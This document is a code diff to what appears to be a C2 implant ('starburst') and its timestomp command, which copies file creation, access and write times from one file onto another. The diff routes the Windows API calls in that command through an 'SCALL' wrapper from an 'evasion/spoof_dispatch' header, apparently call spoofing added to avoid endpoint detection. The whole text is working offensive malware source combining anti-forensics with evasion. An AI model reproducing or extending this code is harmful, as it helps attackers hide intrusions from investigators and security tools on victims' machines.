@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_TIMESTOMP
 
@@ -61,10 +62,10 @@ auto declfn starburst::cmd_timestomp(
     memory::copy( src_buf, source_path, src_copy );
 
     wchar_t wsrc[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, src_buf, -1, wsrc, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, src_buf, -1, wsrc, 520 );
 
     // open source file for reading timestamps
-    HANDLE h_source = inst.kernel32.CreateFileW(
+    HANDLE h_source = (HANDLE)SCALL( inst, kernel32.CreateFileW,
         wsrc, GENERIC_READ, FILE_SHARE_READ,
         nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
 
@@ -78,13 +79,13 @@ auto declfn starburst::cmd_timestomp(
     FILETIME ft_access = {};
     FILETIME ft_write  = {};
 
-    if ( !pGetFileTime( h_source, &ft_create, &ft_access, &ft_write ) ) {
-        inst.kernel32.CloseHandle( h_source );
+    if ( !SCALL_PTR( inst, pGetFileTime, h_source, &ft_create, &ft_access, &ft_write ) ) {
+        SCALL( inst, kernel32.CloseHandle, h_source );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetFileTime failed on source" ) ) );
         return;
     }
-    inst.kernel32.CloseHandle( h_source );
+    SCALL( inst, kernel32.CloseHandle, h_source );
 
     // convert target path to wide
     char tgt_buf[520] = { 0 };
@@ -92,10 +93,10 @@ auto declfn starburst::cmd_timestomp(
     memory::copy( tgt_buf, target_path, tgt_copy );
 
     wchar_t wtgt[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, tgt_buf, -1, wtgt, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, tgt_buf, -1, wtgt, 520 );
 
     // open target with FILE_WRITE_ATTRIBUTES
-    HANDLE h_target = inst.kernel32.CreateFileW(
+    HANDLE h_target = (HANDLE)SCALL( inst, kernel32.CreateFileW,
         wtgt, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE,
         nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
 
@@ -105,14 +106,14 @@ auto declfn starburst::cmd_timestomp(
         return;
     }
 
-    if ( !pSetFileTime( h_target, &ft_create, &ft_access, &ft_write ) ) {
-        inst.kernel32.CloseHandle( h_target );
+    if ( !SCALL_PTR( inst, pSetFileTime, h_target, &ft_create, &ft_access, &ft_write ) ) {
+        SCALL( inst, kernel32.CloseHandle, h_target );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "SetFileTime failed on target" ) ) );
         return;
     }
 
-    inst.kernel32.CloseHandle( h_target );
+    SCALL( inst, kernel32.CloseHandle, h_target );
 
     char msg[256] = { 0 };
     str_copy( msg, symbol<char*>( const_cast<char*>( "timestamps copied from " ) ) );
